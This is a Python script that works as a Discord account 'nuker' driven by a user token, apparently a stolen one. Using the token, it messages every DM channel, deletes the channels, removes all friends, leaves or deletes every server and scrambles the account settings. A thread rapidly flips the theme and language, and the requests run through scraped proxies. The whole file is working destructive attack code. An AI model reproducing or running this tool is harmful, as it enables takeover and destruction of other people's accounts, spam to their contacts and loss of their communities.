import threading
import requests
import random
import os
from colorama import Fore
from time import sleep
from itertools import cycle


token = 'USER_TOKEN_HERE' # Testing purposes

def proxy_scrape():
    temp = os.getenv("temp")+"\\proxies.txt"
    r = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=8500&country=all&ssl=all&anonymity=elite&simplified=true", headers=getheaders())
    with open(temp, "wb") as f:
        f.write(r.content)
    

def proxy():
    temp = os.getenv("temp")+"\\proxies.txt"
    if not os.path.exists(temp):
        with open(temp, "w") as f:
            f.close()
    if os.stat(temp).st_size == 0:
        proxy_scrape()
    proxies = open(temp).read().split('\n')
    proxy = proxies[1]

    with open(temp, 'r+') as fp:
        lines = fp.readlines()
        fp.seek(0)
        fp.truncate()
        fp.writelines(lines[1:])
    return proxy


def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers


def Cookies_Nuke(message_Content, token): 
    if threading.active_count() <= 100:
        t = threading.Thread(target=CustomSeizure, args=(token, ))
        t.start()

    headers = {'Authorization': token}
    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
    for channel in channelIds:
        try:
            requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages',
            proxies={"ftp": f'{proxy()}'},
            headers=headers,
            data={"content": f"{message_Content}"})
        except Exception as e:
            whylol = '12'

    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
    for channel in channelIds:
        try:
            requests.delete(f'https://discord.com/api/v7/channels/'+channel['id'],
            proxies={"ftp": f'{proxy()}'},
            headers=getheaders(token))
        except Exception as e:
            whylol = '12'

    friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", proxies={"ftp": f'{proxy()}'}, headers=getheaders(token)).json()
    for friend in friendIds:
        try:
            requests.delete(
                f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], proxies={"ftp": f'{proxy()}'}, headers=getheaders(token))
        except Exception as e:
            whylol = '12'
    
    guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token)).json()
    for guild in guildsIds:
        try:
            requests.delete(
                f'https://discord.com/api/v8/users/@me/guilds/'+guild['id'], proxies={"ftp": f'{proxy()}'}, headers={'Authorization': token})
        except Exception as e:
            whylol = '12'

    for guild in guildsIds:
        try:
            requests.delete(f'https://discord.com/api/v8/guilds/'+guild['id'], proxies={"ftp": f'{proxy()}'}, headers={'Authorization': token})
        except Exception as e:
            whylol = '12'
    

    t.do_run = False
    requests.delete("https://discord.com/api/v8/hypesquad/online", proxies={"ftp": f'{proxy()}'}, headers=getheaders(token))
    setting = {
          'theme': "light",
          'locale': "ja",
          'message_display_compact': False,
          'inline_embed_media': False,
          'inline_attachment_media': False,
          'gif_auto_play': False,
          'render_embeds': False,
          'render_reactions': False,
          'animate_emoji': False,
          'convert_emoticons': False,
          'enable_tts_command': False,
          'explicit_content_filter': '0',
          'status': "idle"
    }
    requests.patch("https://discord.com/api/v7/users/@me/settings", proxies={"ftp": f'{proxy()}'}, headers=getheaders(token), json=setting)


def CustomSeizure(token):
    t = threading.currentThread()
    while getattr(t, "do_run", True):
        modes = cycle(["light", "dark"])
        #cycle between light/dark mode and languages
        setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch("https://discord.com/api/v7/users/@me/settings", proxies={"ftp": f'{proxy()}'}, headers=getheaders(token), json=setting)
